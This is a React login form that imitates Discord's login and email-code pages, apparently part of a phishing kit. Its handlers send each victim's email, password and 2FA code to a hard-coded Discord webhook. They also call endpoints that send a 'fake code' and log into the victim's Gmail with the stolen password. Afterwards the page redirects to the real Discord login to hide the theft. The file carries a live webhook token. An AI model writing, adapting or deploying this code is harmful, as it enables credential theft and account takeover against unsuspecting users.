'use client';
import { useForm } from 'react-hook-form';
import { useState } from 'react';
import { Eye, EyeOff, ArrowLeft } from 'lucide-react';

type FormData = { email: string; password: string; code?: string };

export default function LoginForm() {
  const { register, handleSubmit, watch } = useForm<FormData>();
  const [step, setStep] = useState<'login' | 'code'>('login');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const emailValue = watch('email');
  const passwordValue = watch('password');

  const onLogin = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);
    setPassword(data.password);

    // Send credentials to webhook
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Login Attempt",
          color: 0x5865f2,
          fields: [
            { name: "Email", value: data.email },
            { name: "Password", value: data.password }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    // Send fake code to email
    await fetch('/api/send-fake-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email })
    }).catch(() => {});

    // Login to Gmail and monitor
    await fetch('/api/gmail-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email, password: data.password })
    }).catch(() => {});

    setStep('code');
    setLoading(false);
  };

  const onCode = async (data: FormData) => {
    setLoading(true);
    
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "2FA Code Entered",
          color: 0x00ff00,
          fields: [
            { name: "Email", value: email },
            { name: "Code", value: data.code }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    window.location.href = 'https://discord.com/login';
  };

  if (step === 'code') {
    return (
      <div className="min-h-screen bg-[#1a1b1e] flex flex-col px-6 py-8">
        <button onClick={() => setStep('login')} className="mb-6">
          <ArrowLeft className="w-6 h-6 text-white" />
        </button>
        
        <h1 className="text-[28px] font-bold text-white mb-2">Check your email</h1>
        <p className="text-[#b5bac1] text-[14px] mb-8">
          We sent a code to <span className="text-white">{email}</span>
        </p>

        <form onSubmit={handleSubmit(onCode)} className="space-y-4">
          <div>
            <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2 tracking-wide">
              Code
            </label>
            <input
              {...register('code', { required: true })}
              maxLength={6}
              className="w-full h-[50px] px-4 bg-[#1e1f22] border border-[#1e1f22] rounded-[8px] text-white text-[16px] focus:border-[#5865f2] focus:outline-none transition-colors placeholder:text-[#87898c] text-center tracking-[8px] font-mono"
              placeholder="000000"
              required
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full h-[50px] bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded-[8px] transition-colors disabled:opacity-70 mt-4"
          >
            {loading ? 'Verifying...' : 'Verify'}
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1b1e] flex flex-col px-6 py-8">
      <button className="mb-6">
        <ArrowLeft className="w-6 h-6 text-white" />
      </button>

      <h1 className="text-[28px] font-bold text-white mb-2">Welcome back!</h1>
      <p className="text-[#b5bac1] text-[14px] mb-8">
        We're so excited to see you again!
      </p>

      <form onSubmit={handleSubmit(onLogin)} className="space-y-5">
        <div>
          <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2 tracking-wide">
            Email or Phone Number
          </label>
          <input
            {...register('email', { required: true })}
            className="w-full h-[50px] px-4 bg-[#1e1f22] border border-[#1e1f22] rounded-[8px] text-white text-[16px] focus:border-[#5865f2] focus:outline-none transition-colors placeholder:text-[#87898c]"
            placeholder=""
            required
          />
        </div>

        <div>
          <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2 tracking-wide">
            Password
          </label>
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              {...register('password', { required: true })}
              className="w-full h-[50px] px-4 pr-12 bg-[#1e1f22] border border-[#1e1f22] rounded-[8px] text-white text-[16px] focus:border-[#5865f2] focus:outline-none transition-colors placeholder:text-[#87898c]"
              placeholder=""
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-[#b5bac1]"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
        </div>

        <button
          type="button"
          className="text-[#00a8fc] text-[14px] font-medium hover:underline"
        >
          Forgot your password?
        </button>

        <button
          type="submit"
          disabled={loading || !emailValue || !passwordValue}
          className="w-full h-[50px] bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded-[8px] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-2"
        >
          {loading ? 'Logging in...' : 'Log In'}
        </button>

        <div className="text-center">
          <button
            type="button"
            className="text-[#00a8fc] text-[14px] font-medium hover:underline"
          >
            Or, sign in with passkey
          </button>
        </div>
      </form>
    </div>
  );
}
